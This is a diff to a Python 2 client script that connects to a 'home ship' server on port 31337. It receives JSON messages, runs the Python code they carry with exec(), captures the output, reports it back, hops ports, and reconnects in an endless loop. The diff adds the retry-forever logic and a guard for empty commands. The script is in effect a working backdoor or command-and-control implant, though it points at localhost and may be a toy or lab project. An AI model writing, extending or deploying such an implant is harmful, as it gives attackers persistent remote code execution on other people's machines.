@@ -4,7 +4,7 @@ import socket,subprocess,time,getpass,fcntl,struct,os,json,sys
 from cStringIO import StringIO
 
 HOST = "127.0.0.1"     # The home ship
-STATICPORT = 31341    # The same port as used by the server
+STATICPORT = 31337     # The same port as used by the server
 PORT = -1
 SCRIPTNAME = os.path.basename(__file__)
 
@@ -30,12 +30,15 @@ def code(command, port):
 	print '[~] Running "{0}"'.format(command)
 
 	try:
-		old_stdout = sys.stdout
-		redirected_output = sys.stdout = StringIO()
-		exec(command)
-		sys.stdout = old_stdout
+		output = ""
 
-		output = redirected_output.getvalue()
+		if command:
+			old_stdout = sys.stdout
+			redirected_output = sys.stdout = StringIO()
+			exec(command)
+			sys.stdout = old_stdout
+
+			output = redirected_output.getvalue()
 
 		try:
 			migratePorts(port, output)
@@ -51,17 +54,17 @@ commands = {"NEWPORT": migratePorts, "CODE": code}
 
 def main():
 	global s
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.settimeout(5)
-	s.connect((HOST, STATICPORT))
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.settimeout(5)
+		s.connect((HOST, STATICPORT))
 
-	while(1):
-		try:
-			data = readuntil(s)[:-1]
-			data = json.loads(data)
-			code(data["code"], data['newport'])
-		except socket.timeout:
-			break
+		while(1):
+				data = readuntil(s)[:-1]
+				data = json.loads(data)
+				code(data["code"], data['newport'])
+	except:
+		time.sleep(5)
 
 	main()
 
